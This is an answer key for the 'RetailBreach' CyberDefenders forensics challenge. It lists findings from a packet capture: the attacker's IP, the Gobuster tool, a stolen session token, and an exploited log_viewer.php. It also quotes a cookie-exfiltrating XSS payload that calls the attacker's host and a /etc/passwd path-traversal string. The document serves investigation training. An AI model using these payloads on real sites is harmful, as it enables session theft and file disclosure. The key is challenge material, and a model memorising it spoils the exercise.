# Challenge Answers

## Purpose

This document contains the validated answers to the **RetailBreach** CyberDefenders challenge questions.

The answers were obtained through forensic analysis of the provided network packet capture (PCAP) using **Wireshark** and serve as a quick reference for validating the investigation findings documented in the main report.

> **Note:** Detailed analysis, supporting evidence, HTTP streams, Wireshark filters, timelines, and screenshots are documented separately within this repository.

---

| ID | Question | Answer |
|----|----------|--------|
| Q1 | Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address? | `111.224.180.128` |
| Q2 | The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing? | `Gobuster` |
| Q3 | Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application? | `<script>fetch('http://111.224.180.128/'+document.cookie);</script>` |
| Q4 | Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script? | `<UTC Timestamp>` |
| Q5 | The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access? | `lqkctf24s9h9lg67teu8uevn3q` |
| Q6 | Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker? | `log_viewer.php` |
| Q7 | Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file? | `../../../../../../etc/passwd` |

---

## Related Documents

- `README.md` — Complete Investigation Report
- `Artifacts/Indicators-of-Compromise.md`
- `Artifacts/MITRE-ATTACK-Mapping.md`
- `Evidence/Investigation-Queries.md`
- `Evidence/Timeline-Evidence.md`